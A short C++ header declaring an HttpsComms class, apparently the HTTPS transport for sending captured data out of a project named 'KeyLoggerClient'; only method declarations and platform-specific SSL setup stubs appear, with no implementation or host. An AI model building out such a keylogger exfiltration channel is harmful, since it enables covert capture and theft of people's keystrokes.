// KeyLoggerClient/include/communication/HttpsComms.h
#ifndef HTTPSCOMMS_H
#define HTTPSCOMMS_H

#include "communication/HttpComms.h"

class HttpsComms : public HttpComms {
public:
    explicit HttpsComms(Configuration* config);
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    
private:
    #if PLATFORM_WINDOWS
    bool ConfigureSslWindows();
    #else
    bool ConfigureSslLinux(CURL* curl);
    #endif
};

#endif